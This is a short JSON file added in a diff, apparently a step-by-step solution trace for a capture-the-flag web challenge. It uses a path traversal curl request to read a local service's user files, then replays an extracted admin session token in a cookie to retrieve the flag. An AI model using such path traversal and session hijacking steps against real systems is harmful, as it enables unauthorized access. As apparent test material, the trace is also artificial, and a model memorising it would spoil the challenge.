@@ -1,0 +1,18 @@
+[
+    {
+        "type": "thought",
+        "content": "Seemingly, we can enumerate users on the service."
+    },
+    {
+        "type": "execution",
+        "content": "curl http://localhost:8001/post.wtf?post=../../../../../../../../../../../tmp/wtf_runtime/wtf.sh/users*"
+    },
+    {
+        "type": "thought",
+        "content": "So, we have extracted the password hash and the token. We can set the token and get the flag as follows:"
+    },
+    {
+        "type": "execution",
+        "content": "curl --cookie \"USERNAME=admin; TOKEN=2xRnmiXo9/f7GCEXkdZ2XqdtaLUAe0KOl7xibP4rMfS82Kfy/PbNuwaDODgRctRxiUxG0ys5Aq5PLlbq4/GPiQ==\" http://localhost:8001/profile.wtf?user=7tLx9"
+    }
+]
